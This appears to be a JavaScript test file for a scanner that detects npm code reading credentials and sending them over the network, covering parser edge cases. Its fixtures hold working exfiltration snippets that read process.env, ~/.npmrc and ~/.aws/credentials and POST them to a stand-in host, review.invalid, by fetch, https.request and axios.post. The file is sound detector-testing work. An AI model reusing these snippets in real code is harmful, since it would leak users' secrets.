// FP-GITHUB-SCRIPT (0.1.9), the review of Oct 18: three HIGH findings, each a real send the narrowing lost that the
// reading before it found. (1) A body's end read too early, at a regular expression's `}` after a class's body (with
// `extends`, a call in it, a static block, a template), a labeled block, or a `break`, `continue`, labeled `break` or
// `debugger` a line's end ends: a name is now narrowed only to a body whose end is certain. (2) The 100 returns, and
// (3) the 200 calls and the 200 functions' parameters, the follower reads: a reading that narrowed a name and met
// any of the follower's limits reads the text as before too. Twin of
// python/tests/registry/test_fp_github_script_review.py and of the engine's flow_scope_tests.rs. Inert text only:
// nothing is executed; the addresses are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { call, importTimeRisk } from "../src/lib/native.js";

const WHOLE = ["environment", "the whole environment", false];
const HARVEST = "reads credentials or the whole environment and sends data over the network";
// statements past which a text is longer than _LD_LONG and meets none of the follower's limits; a comment that takes
// it past the tree's limit
const PLAIN = "\n" + "void 0;\n".repeat(40000);
const PAST = "/*" + " pad".repeat(520000) + "*/\n";

const sent = (text) => {
  const got = call("local_data_sent_at", {}, text);
  return got === null ? null : got.slice(1);
};

const CONTEXTS = {
  "a class": " class Marker {}\n /}/.test(s);\n",
  "a class that extends": " class Marker extends Object {}\n /}/.test(s);\n",
  "a class that extends a call": " class Marker extends (function(){return Object;})() {}\n /}/.test(s);\n",
  "a class's static block": " class Marker { static { Marker.x = 1; } }\n /}/.test(s);\n",
  "a class's template": " class Marker { static t = `${1}`; m() { return `}`; } }\n /}/.test(s);\n",
  "a class expression": " (class Marker {});\n /}/.test(s);\n",
  "a labeled block": " outer: { if (s) break outer; }\n /}/.test(s);\n",
  "a labeled loop": " outer: for (;;) { break outer; }\n /}/.test(s);\n",
  "ASI after break": " for (;;) { break\n /}/.test(s); }\n",
  "ASI after continue": " for (let i = 0; i < 1; i++) { continue\n /}/.test(s); }\n",
  "ASI after a labeled break": " lbl: for (;;) { break lbl\n /}/.test(s); }\n",
  "ASI after debugger": " if (s) { debugger\n /}/.test(s); }\n",
  "ASI after an inner return": " function inner() { return\n /}/.test(s); }\n",
  "an object, then a regular expression": " const o = {a: 1};\n /}/.test(s);\n",
  "a division after ++": " let n = 4; n++ / 2;\n /}/.test(s);\n"
};
const SOURCES = {
  "the environment": ["const payload=JSON.stringify(process.env);", "environment"],
  "~/.npmrc": ["const payload=require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8');", "file"],
  "~/.aws/credentials": ["const payload=require('fs').readFileSync(require('os').homedir()+'/.aws/credentials','utf8');", "file"]
};
const SINKS = {
  fetch: "fetch('https://review.invalid/collect',{method:'POST',body:payload});",
  "https.request": "const req=require('https').request({host:'review.invalid',method:'POST'});req.end(payload);",
  "axios.post": "const axios=require('axios');axios.post('https://review.invalid/collect',payload);"
};
const contextCase = (ctx, source = "the environment", sink = "fetch") =>
  "function leak(s){\n " + SOURCES[source][0] + "\n" + CONTEXTS[ctx] + " " + SINKS[sink] + "\n}\nleak('x');\n";

const returnsCase = (n) => Array.from({ length: n }, (_, k) => `function unused${k}(){return 0;}\n`).join("")
  + "function collect(){const d=JSON.stringify(process.env);return d;}\n"
  + "function send(d){fetch('https://review.invalid/collect',{method:'POST',body:d});}\nsend(collect());\n";
const callsCase = (n) => "function noop(x){}\nfunction collect(){const d=JSON.stringify(process.env);return d;}\n"
  + "function send(d){fetch('https://review.invalid/collect',{method:'POST',body:d});}\n"
  + "noop(0);\n".repeat(n) + "send(collect());\n";
const paramsCase = (n) => "function collect(){const d=JSON.stringify(process.env);return d;}\nsend(collect());\n"
  + Array.from({ length: n }, (_, k) => `function unused${k}(x){void x;}\n`).join("")
  + "function send(d){fetch('https://review.invalid/collect',{method:'POST',body:d});}\n";

test("a body whose end is a guess narrows nothing: each context keeps the send", () => {
  for (const ctx of Object.keys(CONTEXTS)) {
    for (const [source, [, kind]] of Object.entries(SOURCES)) {
      for (const sink of Object.keys(SINKS)) {
        const got = sent(contextCase(ctx, source, sink));
        assert.ok(got !== null, `${ctx}: ${source} by ${sink}`);
        assert.deepEqual([got[0], got[2]], [kind, false], `${ctx}: ${source} by ${sink}`);
      }
    }
    assert.deepEqual(sent(contextCase(ctx) + PLAIN), WHOLE, `${ctx}: a long text`);
  }
  for (const ctx of Object.keys(CONTEXTS)) {
    assert.deepEqual(importTimeRisk(contextCase(ctx) + PAST, "js")[0], [HARVEST], `${ctx}: past the tree's limit`);
  }
});

test("a reading that met a limit reads as before too: at and past each limit", () => {
  const cases = [
    ...[0, 98, 99, 100, 101, 200].map((n) => [`returns ${n}`, returnsCase(n)]),
    ...[0, 190, 196, 197, 198, 199, 200, 201].map((n) => [`calls ${n}`, callsCase(n)]),
    ...[198, 199, 200, 201].map((n) => [`parameters ${n}`, paramsCase(n)])
  ];
  for (const [what, text] of cases) {
    assert.deepEqual(sent(text), WHOLE, what);
    assert.deepEqual(sent(text + PLAIN), WHOLE, `${what}: a long text`);
  }
  for (const [what, text] of cases.filter(([w]) => ["returns 99", "returns 100", "calls 197", "calls 198",
    "parameters 199", "parameters 200"].includes(w))) {
    assert.deepEqual(importTimeRisk(text + PAST, "js")[0], [HARVEST], `${what}: past the tree's limit`);
  }
});
